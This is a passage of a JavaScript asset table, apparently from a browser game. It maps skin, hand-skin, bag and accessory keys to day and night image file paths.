                    SKIN76N: "img/night-skin76.png",
                    SKIN77D: "img/day-skin77.png",
                    SKIN77N: "img/night-skin77.png",
                    SKIN78D: "img/day-skin78.png",
                    SKIN78N: "img/night-skin78.png",
                    SKIN79D: "img/day-skin79.png",
                    SKIN79N: "img/night-skin79.png",
                    SKIN80D: "img/day-skin80.png",
                    SKIN80N: "img/night-skin80.png",
                    SKIN81D: "img/day-skin81.png",
                    SKIN81N: "img/night-skin81.png",
                    SKIN82D: "img/day-skin82.png",
                    SKIN82N: "img/night-skin82.png",
                    SKIN83D: "img/day-skin83.png",
                    SKIN83N: "img/night-skin83.png",
                    SKIN84D: "img/day-skin84.png",
                    SKIN84N: "img/night-skin84.png",
                    SKIN85D: "img/day-skin85.png",
                    SKIN85N: "img/night-skin85.png",
                    SKIN86D: "img/day-skin86.png",
                    SKIN86N: "img/night-skin86.png",
                    SKIN87D: "img/day-skin87.png",
                    SKIN87N: "img/night-skin87.png",
                    SKIN88D: "img/day-skin88.png",
                    SKIN88N: "img/night-skin88.png",
                    SKIN89D: "img/day-skin89.png",
                    SKIN89N: "img/night-skin89.png",
                    SKIN90D: "img/day-skin90.png",
                    SKIN90N: "img/night-skin90.png",
                    SKIN91D: "img/day-skin91.png",
                    SKIN91N: "img/night-skin91.png",
                    SKIN92D: "img/day-skin92.png",
                    SKIN92N: "img/night-skin92.png",
                    SKIN93D: "img/day-skin93.png",
                    SKIN93N: "img/night-skin93.png",
                    SKIN94D: "img/day-skin94.png",
                    SKIN94N: "img/night-skin94.png",
                    SKIN95D: "img/day-skin95.png",
                    SKIN95N: "img/night-skin95.png",
                    SKIN96D: "img/day-skin96.png",
                    SKIN96N: "img/night-skin96.png",
                    SKIN97D: "img/day-skin97.png",
                    SKIN97N: "img/night-skin97.png",
                    SKIN98D: "img/day-skin98.png",
                    SKIN98N: "img/night-skin98.png",
                    SKIN99D: "img/day-skin99.png",
                    SKIN99N: "img/night-skin99.png",
                    SKIN100D: "img/day-skin100.png",
                    SKIN100N: "img/night-skin100.png",
                    SKIN101D: "img/day-skin101.png",
                    SKIN101N: "img/night-skin101.png",
                    SKIN102D: "img/day-skin102.png",
                    SKIN102N: "img/night-skin102.png",
                    SKIN103D: "img/day-skin103.png",
                    SKIN103N: "img/night-skin103.png",
                    SKIN104D: "img/day-skin104.png",
                    SKIN104N: "img/night-skin104.png",
                    SKIN105D: "img/day-skin105.png",
                    SKIN105N: "img/night-skin105.png",
                    SKIN106D: "img/day-skin106.png",
                    SKIN106N: "img/night-skin106.png",
                    SKIN107D: "img/day-skin107.png",
                    SKIN107N: "img/night-skin107.png",
                    SKIN108D: "img/day-skin108.png",
                    SKIN108N: "img/night-skin108.png",
                    SKIN109D: "img/day-skin109.png",
                    SKIN109N: "img/night-skin109.png",
                    SKIN110D: "img/day-skin110.png",
                    SKIN110N: "img/night-skin110.png",
                    SKIN111D: "img/day-skin111.png",
                    SKIN111N: "img/night-skin111.png",
                    SKIN112D: "img/day-skin112.png",
                    SKIN112N: "img/night-skin112.png",
                    SKIN113D: "img/day-skin113.png",
                    SKIN113N: "img/night-skin113.png",
                    SKIN114D: "img/day-skin114.png",
                    SKIN114N: "img/night-skin114.png",
                    SKIN115D: "img/day-skin115.png",
                    SKIN115N: "img/night-skin115.png",
                    SKIN116D: "img/day-skin116.png",
                    SKIN116N: "img/night-skin116.png",
                    SKIN117D: "img/day-skin117.png",
                    SKIN117N: "img/night-skin117.png",
                    SKIN118D: "img/day-skin118.png",
                    SKIN118N: "img/night-skin118.png",
                    SKIN119D: "img/day-skin119.png",
                    SKIN119N: "img/night-skin119.png",
                    SKIN120D: "img/day-skin120.png",
                    SKIN120N: "img/night-skin120.png",
                    SKIN121D: "img/day-skin121.png",
                    SKIN121N: "img/night-skin121.png",
                    SKIN122D: "img/day-skin122.png",
                    SKIN122N: "img/night-skin122.png",
                    SKIN123D: "img/day-skin123.png",
                    SKIN123N: "img/night-skin123.png",
                    SKIN124D: "img/day-skin124.png",
                    SKIN124N: "img/night-skin124.png",
                    SKIN125D: "img/day-skin125.png",
                    SKIN125N: "img/night-skin125.png",
                    SKIN126D: "img/day-skin126.png",
                    SKIN126N: "img/night-skin126.png",
                    SKIN127D: "img/day-skin127.png",
                    SKIN127N: "img/night-skin127.png",
                    SKIN128D: "img/day-skin128.png",
                    SKIN128N: "img/night-skin128.png",
                    SKIN129D: "img/day-skin129.png",
                    SKIN129N: "img/night-skin129.png",
                    SKIN130D: "img/day-skin130-1.png",
                    SKIN130N: "img/night-skin130-1.png",
                    SKIN131D: "img/day-skin131.png",
                    SKIN131N: "img/night-skin131.png",
                    SKIN132D: "img/day-skin132.png",
                    SKIN132N: "img/night-skin132.png",
                    SKIN133D: "img/day-skin133.png",
                    SKIN133N: "img/night-skin133.png",
                    SKIN134D: "img/day-skin134.png",
                    SKIN134N: "img/night-skin134.png",
                    SKIN135D: "img/day-skin135.png",
                    SKIN135N: "img/night-skin135.png",
                    SKIN136D: "img/day-skin136.png",
                    SKIN136N: "img/night-skin136.png",
                    SKIN137D: "img/day-skin137.png",
                    SKIN137N: "img/night-skin137.png",
                    SKIN138D: "img/day-skin138.png",
                    SKIN138N: "img/night-skin138.png",
                    SKIN139D: "img/day-skin139.png",
                    SKIN139N: "img/night-skin139.png",
                    SKIN140D: "img/day-skin140.png",
                    SKIN140N: "img/night-skin140.png",
                    SKIN141D: "img/day-skin141.png",
                    SKIN141N: "img/night-skin141.png",
                    SKIN142D: "img/day-skin142.png",
                    SKIN142N: "img/night-skin142.png",
                    SKIN143D: "img/day-skin143.png",
                    SKIN143N: "img/night-skin143.png",
                    SKIN144D: "img/day-skin144.png",
                    SKIN144N: "img/night-skin144.png",
                    SKIN145D: "img/day-skin145.png",
                    SKIN145N: "img/night-skin145.png",
                    SKIN146D: "img/day-skin146.png",
                    SKIN146N: "img/night-skin146.png",
                    SKIN147D: "img/day-skin147.png",
                    SKIN147N: "img/night-skin147.png",
                    SKIN148D: "img/day-skin148.png",
                    SKIN148N: "img/night-skin148.png",
                    SKIN149D: "img/day-skin149.png",
                    SKIN149N: "img/night-skin149.png",
                    SKIN150D: "img/day-skin150.png",
                    SKIN150N: "img/night-skin150.png",
                    HAND_SKIN0D: "img/day-hand-skin0.png",
                    HAND_SKIN0N: "img/night-hand-skin0.png",
                    HAND_SKIN1D: "img/day-hand-skin1.png",
                    HAND_SKIN1N: "img/night-hand-skin1.png",
                    HAND_SKIN2D: "img/day-hand-skin2.png",
                    HAND_SKIN2N: "img/night-hand-skin2.png",
                    HAND_SKIN3D: "img/day-hand-skin3.png",
                    HAND_SKIN3N: "img/night-hand-skin3.png",
                    HAND_SKIN4D: "img/day-hand-skin4.png",
                    HAND_SKIN4N: "img/night-hand-skin4.png",
                    HAND_SKIN5D: "img/day-hand-skin5.png",
                    HAND_SKIN5N: "img/night-hand-skin5.png",
                    HAND_SKIN6D: "img/day-hand-skin6.png",
                    HAND_SKIN6N: "img/night-hand-skin6.png",
                    HAND_SKIN7D: "img/day-hand-skin6.png",
                    HAND_SKIN7N: "img/night-hand-skin6.png",
                    HAND_SKIN8D: "img/day-hand-skin8.png",
                    HAND_SKIN8N: "img/night-hand-skin8.png",
                    HAND_SKIN9D: "img/day-hand-skin9.png",
                    HAND_SKIN9N: "img/night-hand-skin9.png",
                    HAND_SKIN10D: "img/day-hand-skin10.png",
                    HAND_SKIN10N: "img/night-hand-skin10.png",
                    HAND_SKIN11D: "img/day-hand-skin11.png",
                    HAND_SKIN11N: "img/night-hand-skin11.png",
                    HAND_SKIN12D: "img/day-hand-skin12.png",
                    HAND_SKIN12N: "img/night-hand-skin12.png",
                    HAND_SKIN13D: "img/day-hand-skin13.png",
                    HAND_SKIN13N: "img/night-hand-skin13.png",
                    HAND_SKIN14D: "img/day-hand-skin14.png",
                    HAND_SKIN14N: "img/night-hand-skin14.png",
                    HAND_SKIN15D: "img/day-hand-skin15.png",
                    HAND_SKIN15N: "img/night-hand-skin15.png",
                    HAND_SKIN16D: "img/day-hand-skin16.png",
                    HAND_SKIN16N: "img/night-hand-skin16.png",
                    HAND_SKIN17D: "img/day-hand-skin17.png",
                    HAND_SKIN17N: "img/night-hand-skin17.png",
                    HAND_SKIN18D: "img/day-hand-skin18.png",
                    HAND_SKIN18N: "img/night-hand-skin18.png",
                    HAND_SKIN19D: "img/day-hand-skin19.png",
                    HAND_SKIN19N: "img/night-hand-skin19.png",
                    HAND_SKIN20D: "img/day-hand-skin20.png",
                    HAND_SKIN20N: "img/night-hand-skin20.png",
                    HAND_SKIN21D: "img/day-hand-skin21.png",
                    HAND_SKIN21N: "img/night-hand-skin21.png",
                    HAND_SKIN22D: "img/day-hand-skin22.png",
                    HAND_SKIN22N: "img/night-hand-skin22.png",
                    HAND_SKIN23D: "img/day-hand-skin23.png",
                    HAND_SKIN23N: "img/night-hand-skin23.png",
                    HAND_SKIN24D: "img/day-hand-skin24.png",
                    HAND_SKIN24N: "img/night-hand-skin24.png",
                    HAND_SKIN25D: "img/day-hand-skin25.png",
                    HAND_SKIN25N: "img/night-hand-skin25.png",
                    HAND_SKIN26D: "img/day-hand-skin26.png",
                    HAND_SKIN26N: "img/night-hand-skin26.png",
                    HAND_SKIN27D: "img/day-hand-skin27.png",
                    HAND_SKIN27N: "img/night-hand-skin27.png",
                    HAND_SKIN28D: "img/day-hand-skin28.png",
                    HAND_SKIN28N: "img/night-hand-skin28.png",
                    HAND_SKIN29D: "img/day-hand-skin29.png",
                    HAND_SKIN29N: "img/night-hand-skin29.png",
                    HAND_SKIN30D: "img/day-hand-skin30.png",
                    HAND_SKIN30N: "img/night-hand-skin30.png",
                    HAND_SKIN31D: "img/day-hand-skin31.png",
                    HAND_SKIN31N: "img/night-hand-skin31.png",
                    HAND_SKIN32D: "img/day-hand-skin32.png",
                    HAND_SKIN32N: "img/night-hand-skin32.png",
                    HAND_SKIN33D: "img/day-hand-skin33.png",
                    HAND_SKIN33N: "img/night-hand-skin33.png",
                    HAND_SKIN34D: "img/day-hand-skin34.png",
                    HAND_SKIN34N: "img/night-hand-skin34.png",
                    HAND_SKIN35D: "img/day-hand-skin35.png",
                    HAND_SKIN35N: "img/night-hand-skin35.png",
                    HAND_SKIN36D: "img/day-hand-skin36.png",
                    HAND_SKIN36N: "img/night-hand-skin36.png",
                    HAND_SKIN37D: "img/day-hand-skin37.png",
                    HAND_SKIN37N: "img/night-hand-skin37.png",
                    HAND_SKIN38D: "img/day-hand-skin38.png",
                    HAND_SKIN38N: "img/night-hand-skin38.png",
                    HAND_SKIN39D: "img/day-hand-skin39.png",
                    HAND_SKIN39N: "img/night-hand-skin39.png",
                    HAND_SKIN40D: "img/day-hand-skin40.png",
                    HAND_SKIN40N: "img/night-hand-skin40.png",
                    HAND_SKIN41D: "img/day-hand-skin41.png",
                    HAND_SKIN41N: "img/night-hand-skin41.png",
                    HAND_SKIN42D: "img/day-hand-skin42.png",
                    HAND_SKIN42N: "img/night-hand-skin42.png",
                    HAND_SKIN43D: "img/day-hand-skin43.png",
                    HAND_SKIN43N: "img/night-hand-skin43.png",
                    HAND_SKIN44D: "img/day-hand-skin16.png",
                    HAND_SKIN44N: "img/night-hand-skin16.png",
                    HAND_SKIN45D: "img/day-hand-skin45.png",
                    HAND_SKIN45N: "img/night-hand-skin45.png",
                    HAND_SKIN46D: "img/day-hand-skin46.png",
                    HAND_SKIN46N: "img/night-hand-skin46.png",
                    HAND_SKIN47D: "img/day-hand-skin47.png",
                    HAND_SKIN47N: "img/night-hand-skin47.png",
                    HAND_SKIN48D: "img/day-hand-skin48.png",
                    HAND_SKIN48N: "img/night-hand-skin48.png",
                    HAND_SKIN49D: "img/day-hand-skin49.png",
                    HAND_SKIN49N: "img/night-hand-skin49.png",
                    HAND_SKIN50D: "img/day-hand-skin49.png",
                    HAND_SKIN50N: "img/night-hand-skin49.png",
                    HAND_SKIN51D: "img/day-hand-skin51.png",
                    HAND_SKIN51N: "img/night-hand-skin51.png",
                    HAND_SKIN52D: "img/day-hand-skin52.png",
                    HAND_SKIN52N: "img/night-hand-skin52.png",
                    HAND_SKIN53D: "img/day-hand-skin53.png",
                    HAND_SKIN53N: "img/night-hand-skin53.png",
                    HAND_SKIN54D: "img/day-hand-skin53.png",
                    HAND_SKIN54N: "img/night-hand-skin53.png",
                    HAND_SKIN55D: "img/day-hand-skin55.png",
                    HAND_SKIN55N: "img/night-hand-skin55.png",
                    HAND_SKIN56D: "img/day-hand-skin56.png",
                    HAND_SKIN56N: "img/night-hand-skin56.png",
                    HAND_SKIN57D: "img/day-hand-skin57.png",
                    HAND_SKIN57N: "img/night-hand-skin57.png",
                    HAND_SKIN58D: "img/day-hand-skin58.png",
                    HAND_SKIN58N: "img/night-hand-skin58.png",
                    HAND_SKIN59D: "img/day-hand-skin59.png",
                    HAND_SKIN59N: "img/night-hand-skin59.png",
                    HAND_SKIN60D: "img/day-hand-skin61.png",
                    HAND_SKIN60N: "img/night-hand-skin61.png",
                    HAND_SKIN61D: "img/day-hand-skin61.png",
                    HAND_SKIN61N: "img/night-hand-skin61.png",
                    HAND_SKIN62D: "img/day-hand-skin62.png",
                    HAND_SKIN62N: "img/night-hand-skin62.png",
                    HAND_SKIN63D: "img/day-hand-skin63.png",
                    HAND_SKIN63N: "img/night-hand-skin63.png",
                    HAND_SKIN64D: "img/day-hand-skin64.png",
                    HAND_SKIN64N: "img/night-hand-skin64.png",
                    HAND_SKIN65D: "img/day-hand-skin65.png",
                    HAND_SKIN65N: "img/night-hand-skin65.png",
                    HAND_SKIN66D: "img/day-hand-skin66.png",
                    HAND_SKIN66N: "img/night-hand-skin66.png",
                    HAND_SKIN67D: "img/day-hand-skin67.png",
                    HAND_SKIN67N: "img/night-hand-skin67.png",
                    HAND_SKIN68D: "img/day-hand-skin68.png",
                    HAND_SKIN68N: "img/night-hand-skin68.png",
                    HAND_SKIN69D: "img/day-hand-skin69.png",
                    HAND_SKIN69N: "img/night-hand-skin69.png",
                    HAND_SKIN70D: "img/day-hand-skin70.png",
                    HAND_SKIN70N: "img/night-hand-skin70.png",
                    HAND_SKIN71D: "img/day-hand-skin71.png",
                    HAND_SKIN71N: "img/night-hand-skin71.png",
                    HAND_SKIN72D: "img/day-hand-skin72.png",
                    HAND_SKIN72N: "img/night-hand-skin72.png",
                    HAND_SKIN73D: "img/day-hand-skin73.png",
                    HAND_SKIN73N: "img/night-hand-skin73.png",
                    HAND_SKIN74D: "img/day-hand-skin74.png",
                    HAND_SKIN74N: "img/night-hand-skin74.png",
                    HAND_SKIN75D: "img/day-hand-skin75.png",
                    HAND_SKIN75N: "img/night-hand-skin75.png",
                    HAND_SKIN76D: "img/day-hand-skin76.png",
                    HAND_SKIN76N: "img/night-hand-skin76.png",
                    HAND_SKIN77D: "img/day-hand-skin77.png",
                    HAND_SKIN77N: "img/night-hand-skin77.png",
                    HAND_SKIN78D: "img/day-hand-skin78.png",
                    HAND_SKIN78N: "img/night-hand-skin78.png",
                    HAND_SKIN79D: "img/day-hand-skin79.png",
                    HAND_SKIN79N: "img/night-hand-skin79.png",
                    HAND_SKIN80D: "img/day-hand-skin80.png",
                    HAND_SKIN80N: "img/night-hand-skin80.png",
                    HAND_SKIN81D: "img/day-hand-skin81.png",
                    HAND_SKIN81N: "img/night-hand-skin81.png",
                    HAND_SKIN82D: "img/day-hand-skin82.png",
                    HAND_SKIN82N: "img/night-hand-skin82.png",
                    HAND_SKIN83D: "img/day-hand-skin83.png",
                    HAND_SKIN83N: "img/night-hand-skin83.png",
                    HAND_SKIN84D: "img/day-hand-skin84.png",
                    HAND_SKIN84N: "img/night-hand-skin84.png",
                    HAND_SKIN85D: "img/day-hand-skin85.png",
                    HAND_SKIN85N: "img/night-hand-skin85.png",
                    HAND_SKIN86D: "img/day-hand-skin86.png",
                    HAND_SKIN86N: "img/night-hand-skin86.png",
                    HAND_SKIN87D: "img/day-hand-skin87.png",
                    HAND_SKIN87N: "img/night-hand-skin87.png",
                    HAND_SKIN88D: "img/day-hand-skin88.png",
                    HAND_SKIN88N: "img/night-hand-skin88.png",
                    HAND_SKIN89D: "img/day-hand-skin89.png",
                    HAND_SKIN89N: "img/night-hand-skin89.png",
                    HAND_SKIN90D: "img/day-hand-skin90.png",
                    HAND_SKIN90N: "img/night-hand-skin90.png",
                    HAND_SKIN91D: "img/day-hand-skin91.png",
                    HAND_SKIN91N: "img/night-hand-skin91.png",
                    HAND_SKIN92D: "img/day-hand-skin92.png",
                    HAND_SKIN92N: "img/night-hand-skin92.png",
                    HAND_SKIN93D: "img/day-hand-skin93.png",
                    HAND_SKIN93N: "img/night-hand-skin93.png",
                    HAND_SKIN94D: "img/day-hand-skin94.png",
                    HAND_SKIN94N: "img/night-hand-skin94.png",
                    HAND_SKIN95D: "img/day-hand-skin95.png",
                    HAND_SKIN95N: "img/night-hand-skin95.png",
                    HAND_SKIN96D: "img/day-hand-skin96.png",
                    HAND_SKIN96N: "img/night-hand-skin96.png",
                    HAND_SKIN97D: "img/day-hand-skin97.png",
                    HAND_SKIN97N: "img/night-hand-skin97.png",
                    HAND_SKIN98D: "img/day-hand-skin98.png",
                    HAND_SKIN98N: "img/night-hand-skin98.png",
                    HAND_SKIN99D: "img/day-hand-skin99.png",
                    HAND_SKIN99N: "img/night-hand-skin99.png",
                    HAND_SKIN100D: "img/day-hand-skin100.png",
                    HAND_SKIN100N: "img/night-hand-skin100.png",
                    HAND_SKIN101D: "img/day-hand-skin101.png",
                    HAND_SKIN101N: "img/night-hand-skin101.png",
                    HAND_SKIN102D: "img/day-hand-skin102.png",
                    HAND_SKIN102N: "img/night-hand-skin102.png",
                    HAND_SKIN103D: "img/day-hand-skin103.png",
                    HAND_SKIN103N: "img/night-hand-skin103.png",
                    HAND_SKIN104D: "img/day-hand-skin104.png",
                    HAND_SKIN104N: "img/night-hand-skin104.png",
                    HAND_SKIN105D: "img/day-hand-skin105.png",
                    HAND_SKIN105N: "img/night-hand-skin105.png",
                    HAND_SKIN106D: "img/day-hand-skin106.png",
                    HAND_SKIN106N: "img/night-hand-skin106.png",
                    HAND_SKIN107D: "img/day-hand-skin107.png",
                    HAND_SKIN107N: "img/night-hand-skin107.png",
                    HAND_SKIN108D: "img/day-hand-skin108.png",
                    HAND_SKIN108N: "img/night-hand-skin108.png",
                    HAND_SKIN109D: "img/day-hand-skin109.png",
                    HAND_SKIN109N: "img/night-hand-skin109.png",
                    HAND_SKIN110D: "img/day-hand-skin110.png",
                    HAND_SKIN110N: "img/night-hand-skin110.png",
                    HAND_SKIN111D: "img/day-hand-skin111.png",
                    HAND_SKIN111N: "img/night-hand-skin111.png",
                    HAND_SKIN112D: "img/day-hand-skin112.png",
                    HAND_SKIN112N: "img/night-hand-skin112.png",
                    HAND_SKIN113D: "img/day-hand-skin113.png",
                    HAND_SKIN113N: "img/night-hand-skin113.png",
                    HAND_SKIN114D: "img/day-hand-skin114.png",
                    HAND_SKIN114N: "img/night-hand-skin114.png",
                    HAND_SKIN115D: "img/day-hand-skin115.png",
                    HAND_SKIN115N: "img/night-hand-skin115.png",
                    HAND_SKIN116D: "img/day-hand-skin116.png",
                    HAND_SKIN116N: "img/night-hand-skin116.png",
                    HAND_SKIN117D: "img/day-hand-skin117.png",
                    HAND_SKIN117N: "img/night-hand-skin117.png",
                    HAND_SKIN118D: "img/day-hand-skin118.png",
                    HAND_SKIN118N: "img/night-hand-skin118.png",
                    HAND_SKIN119D: "img/day-hand-skin119.png",
                    HAND_SKIN119N: "img/night-hand-skin119.png",
                    HAND_SKIN120D: "img/day-hand-skin120.png",
                    HAND_SKIN120N: "img/night-hand-skin120.png",
                    HAND_SKIN121D: "img/day-hand-skin122.png",
                    HAND_SKIN121N: "img/night-hand-skin122.png",
                    HAND_SKIN122D: "img/day-hand-skin122.png",
                    HAND_SKIN122N: "img/night-hand-skin122.png",
                    HAND_SKIN123D: "img/day-hand-skin122.png",
                    HAND_SKIN123N: "img/night-hand-skin122.png",
                    HAND_SKIN124D: "img/day-hand-skin124.png",
                    HAND_SKIN124N: "img/night-hand-skin124.png",
                    HAND_SKIN125D: "img/day-hand-skin125.png",
                    HAND_SKIN125N: "img/night-hand-skin125.png",
                    HAND_SKIN126D: "img/day-hand-skin126.png",
                    HAND_SKIN126N: "img/night-hand-skin126.png",
                    HAND_SKIN127D: "img/day-hand-skin127.png",
                    HAND_SKIN127N: "img/night-hand-skin127.png",
                    HAND_SKIN128D: "img/day-hand-skin128.png",
                    HAND_SKIN128N: "img/night-hand-skin128.png",
                    HAND_SKIN129D: "img/day-hand-skin129.png",
                    HAND_SKIN129N: "img/night-hand-skin129.png",
                    HAND_SKIN130D: "img/day-hand-skin130.png",
                    HAND_SKIN130N: "img/night-hand-skin130.png",
                    HAND_SKIN131D: "img/day-hand-skin131.png",
                    HAND_SKIN131N: "img/night-hand-skin131.png",
                    HAND_SKIN132D: "img/day-hand-skin130.png",
                    HAND_SKIN132N: "img/night-hand-skin130.png",
                    HAND_SKIN133D: "img/day-hand-skin133.png",
                    HAND_SKIN133N: "img/night-hand-skin133.png",
                    HAND_SKIN134D: "img/day-hand-skin134.png",
                    HAND_SKIN134N: "img/night-hand-skin134.png",
                    HAND_SKIN135D: "img/day-hand-skin135.png",
                    HAND_SKIN135N: "img/night-hand-skin135.png",
                    HAND_SKIN136D: "img/day-hand-skin136.png",
                    HAND_SKIN136N: "img/night-hand-skin136.png",
                    HAND_SKIN137D: "img/day-hand-skin137.png",
                    HAND_SKIN137N: "img/night-hand-skin137.png",
                    HAND_SKIN138D: "img/day-hand-skin138.png",
                    HAND_SKIN138N: "img/night-hand-skin138.png",
                    HAND_SKIN139D: "img/day-hand-skin139.png",
                    HAND_SKIN139N: "img/night-hand-skin139.png",
                    HAND_SKIN140D: "img/day-hand-skin140.png",
                    HAND_SKIN140N: "img/night-hand-skin140.png",
                    HAND_SKIN141D: "img/day-hand-skin141.png",
                    HAND_SKIN141N: "img/night-hand-skin141.png",
                    HAND_SKIN142D: "img/day-hand-skin142.png",
                    HAND_SKIN142N: "img/night-hand-skin142.png",
                    HAND_SKIN143D: "img/day-hand-skin143.png",
                    HAND_SKIN143N: "img/night-hand-skin143.png",
                    HAND_SKIN144D: "img/day-hand-skin144.png",
                    HAND_SKIN144N: "img/night-hand-skin144.png",
                    HAND_SKIN145D: "img/day-hand-skin145.png",
                    HAND_SKIN145N: "img/night-hand-skin145.png",
                    HAND_SKIN146D: "img/day-hand-skin146.png",
                    HAND_SKIN146N: "img/night-hand-skin146.png",
                    HAND_SKIN147D: "img/day-hand-skin147.png",
                    HAND_SKIN147N: "img/night-hand-skin147.png",
                    HAND_SKIN148D: "img/day-hand-skin148.png",
                    HAND_SKIN148N: "img/night-hand-skin148.png",
                    HAND_SKIN149D: "img/day-hand-skin149.png",
                    HAND_SKIN149N: "img/night-hand-skin149.png",
                    HAND_SKIN150D: "img/day-hand-skin150.png",
                    HAND_SKIN150N: "img/night-hand-skin150.png",
                    BAG_STARD: "img/day-bag-star0.png",
                    BAG_STARN: "img/night-bag-star0.png",
                    BAG0D: "img/day-bag0.png",
                    BAG0N: "img/night-bag0.png",
                    BAG1D: "img/day-bag1.png",
                    BAG1N: "img/night-bag1.png",
                    BAG2D: "img/day-bag2.png",
                    BAG2N: "img/night-bag2.png",
                    BAG3D: "img/day-bag3.png",
                    BAG3N: "img/night-bag3.png",
                    BAG4D: "img/day-bag4.png",
                    BAG4N: "img/night-bag4.png",
                    BAG5D: "img/day-bag5.png",
                    BAG5N: "img/night-bag5.png",
                    BAG6D: "img/day-bag6.png",
                    BAG6N: "img/night-bag6.png",
                    BAG7D: "img/day-bag7.png",
                    BAG7N: "img/night-bag7.png",
                    BAG8D: "img/day-bag8.png",
                    BAG8N: "img/night-bag8.png",
                    BAG9D: "img/day-bag9.png",
                    BAG9N: "img/night-bag9.png",
                    BAG10D: "img/day-bag10.png",
                    BAG10N: "img/night-bag10.png",
                    BAG11D: "img/day-bag11.png",
                    BAG11N: "img/night-bag11.png",
                    BAG13D: "img/day-bag13.png",
                    BAG13N: "img/night-bag13.png",
                    BAG14D: "img/day-bag14.png",
                    BAG14N: "img/night-bag14.png",
                    BAG16D: "img/day-bag16.png",
                    BAG16N: "img/night-bag16.png",
                    BAG17D: "img/day-bag17.png",
                    BAG17N: "img/night-bag17.png",
                    BAG18D: "img/day-bag18.png",
                    BAG18N: "img/night-bag18.png",
                    BAG19D: "img/day-bag19.png",
                    BAG19N: "img/night-bag19.png",
                    BAG20D: "img/day-bag20.png",
                    BAG20N: "img/night-bag20.png",
                    BAG21D: "img/day-bag21.png",
                    BAG21N: "img/night-bag21.png",
                    BAG22D: "img/day-bag22.png",
                    BAG22N: "img/night-bag22.png",
                    BAG23D: "img/day-bag23.png",
                    BAG23N: "img/night-bag23.png",
                    BAG24D: "img/day-bag24.png",
                    BAG24N: "img/night-bag24.png",
                    BAG25D: "img/day-bag25.png",
                    BAG25N: "img/night-bag25.png",
                    BAG26D: "img/day-bag26.png",
                    BAG26N: "img/night-bag26.png",
                    BAG27D: "img/day-bag27.png",
                    BAG27N: "img/night-bag27.png",
                    BAG28D: "img/day-bag28.png",
                    BAG28N: "img/night-bag28.png",
                    BAG29D: "img/day-bag29.png",
                    BAG29N: "img/night-bag29.png",
                    BAG30D: "img/day-bag30.png",
                    BAG30N: "img/night-bag30.png",
                    BAG31D: "img/day-bag31.png",
                    BAG31N: "img/night-bag31.png",
                    BAG32D: "img/day-bag32.png",
                    BAG32N: "img/night-bag32.png",
                    BAG33D: "img/day-bag33.png",
                    BAG33N: "img/night-bag33.png",
                    BAG34D: "img/day-bag34.png",
                    BAG34N: "img/night-bag34.png",
                    BAG35D: "img/day-bag35.png",
                    BAG35N: "img/night-bag35.png",
                    BAG36D: "img/day-bag36.png",
                    BAG36N: "img/night-bag36.png",
                    BAG37D: "img/day-bag37.png",
                    BAG37N: "img/night-bag37.png",
                    BAG38D: "img/day-bag38.png",
                    BAG38N: "img/night-bag38.png",
                    BAG39D: "img/day-bag39.png",
                    BAG39N: "img/night-bag39.png",
                    BAG40D: "img/day-bag40.png",
                    BAG40N: "img/night-bag40.png",
                    BAG41D: "img/day-bag41.png",
                    BAG41N: "img/night-bag41.png",
                    BAG42D: "img/day-bag42.png",
                    BAG42N: "img/night-bag42.png",
                    BAG43D: "img/day-bag43.png",
                    BAG43N: "img/night-bag43.png",
                    BAG44D: "img/day-bag44.png",
                    BAG44N: "img/night-bag44.png",
                    BAG45D: "img/day-bag45.png",
                    BAG45N: "img/night-bag45.png",
                    BAG46D: "img/day-bag46.png",
                    BAG46N: "img/night-bag46.png",
                    BAG47D: "img/day-bag47.png",
                    BAG47N: "img/night-bag47.png",
                    BAG48D: "img/day-bag48.png",
                    BAG48N: "img/night-bag48.png",
                    BAG49D: "img/day-bag49.png",
                    BAG49N: "img/night-bag49.png",
                    BAG50D: "img/day-bag50.png",
                    BAG50N: "img/night-bag50.png",
                    BAG51D: "img/day-bag51.png",
                    BAG51N: "img/night-bag51.png",
                    BAG52D: "img/day-bag52.png",
                    BAG52N: "img/night-bag52.png",
                    BAG53D: "img/day-bag53.png",
                    BAG53N: "img/night-bag53.png",
                    BAG54D: "img/day-bag54.png",
                    BAG54N: "img/night-bag54.png",
                    BAG55D: "img/day-bag55.png",
                    BAG55N: "img/night-bag55.png",
                    BAG56D: "img/day-bag56.png",
                    BAG56N: "img/night-bag56.png",
                    BAG57D: "img/day-bag57.png",
                    BAG57N: "img/night-bag57.png",
                    BAG58D: "img/day-bag58.png",
                    BAG58N: "img/night-bag58.png",
                    BAG59D: "img/day-bag59.png",
                    BAG59N: "img/night-bag59.png",
                    BAG60D: "img/day-bag60.png",
                    BAG60N: "img/night-bag60.png",
                    BAG61D: "img/day-bag61.png",
                    BAG61N: "img/night-bag61.png",
                    BAG62D: "img/day-bag62.png",
                    BAG62N: "img/night-bag62.png",
                    BAG63D: "img/day-bag63.png",
                    BAG63N: "img/night-bag63.png",
                    BAG64D: "img/day-bag64.png",
                    BAG64N: "img/night-bag64.png",
                    BAG65D: "img/day-bag65.png",
                    BAG65N: "img/night-bag65.png",
                    BAG66D: "img/day-bag66.png",
                    BAG66N: "img/night-bag66.png",
                    BAG67D: "img/day-bag67.png",
                    BAG67N: "img/night-bag67.png",
                    BAG68D: "img/day-bag68.png",
                    BAG68N: "img/night-bag68.png",
                    ACCESSORY0D: "img/day-accessory0.png",
                    ACCESSORY17D: "img/day-accessory0-pacques.png",
                    ACCESSORY17N: "img/night-accessory0-pacques.png",
                    ACCESSORY13D: "img/day-accessory13.png",
                    ACCESSORY13N: "img/night-accessory13.png",
                    ACCESSORY14D: "img/day-accessory14.png",
                    ACCESSORY14N: "img/night-accessory14.png",
                    ACCESSORY15D: "img/day-accessory15.png",
                    ACCESSORY15N: "img/night-accessory15.png",
                    ACCESSORY16D: "img/day-accessory16.png",
                    ACCESSORY16N: "img/night-accessory16.png",
                    ACCESSORY18D: "img/day-accessory17.png",
                    ACCESSORY18N: "img/day-accessory17.png",
                    ACCESSORY19D: "img/day-accessory19.png",
                    ACCESSORY19N: "img/night-accessory19.png",
                    ACCESSORY20D: "img/day-accessory20.png",
                    ACCESSORY20N: "img/night-accessory20.png",
                    ACCESSORY21D: "img/day-accessory21.png",
                    ACCESSORY21N: "img/night-accessory21.png",
                    ACCESSORY22D: "img/day-accessory22.png",
                    ACCESSORY22N: "img/night-accessory22.png",
                    ACCESSORY23D: "img/day-accessory23.png",
                    ACCESSORY23N: "img/night-accessory23.png",
                    ACCESSORY24D: "img/day-accessory24.png",
                    ACCESSORY24N: "img/night-accessory24.png",
                    ACCESSORY25D: "img/day-accessory25.png",
                    ACCESSORY25N: "img/night-accessory25.png",
